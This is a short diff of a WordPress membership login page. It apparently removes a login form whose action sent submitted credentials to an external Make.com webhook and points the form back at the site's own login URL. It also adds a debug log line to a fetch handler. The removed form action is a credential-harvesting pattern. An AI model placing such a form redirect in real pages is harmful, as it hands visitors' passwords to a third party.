@@ -216,7 +216,7 @@ var woocommerce_params = {"ajax_url":"\/wp-admin\/admin-ajax.php","wc_ajax_url":
 		<div class="large-12 col">
 			<div class="col-inner">
     <div class="ihc-login-form-wrap ihc-login-template-13">
-        <form action="https://hook.eu2.make.com/64pyy2l1vw33vc0xd5kchfszj9gsg76k" method="post" id="ihc_login_form">
+        <form action="https://www.ridersco.com.co/member-login/" method="post" id="ihc_login_form">
             <input type="hidden" name="ihcaction" value="login" />
             <input type="hidden" name="ihc_login_nonce" value="abcbc77aae" />
             <div class="impu-form-line-fr">
@@ -267,6 +267,7 @@ var woocommerce_params = {"ajax_url":"\/wp-admin\/admin-ajax.php","wc_ajax_url":
                     }
                 })
                 .then(response => {
+			console.log('Response:', response);
                     console.log('Status Code:', response.status);
                 })
                 .catch(error => {
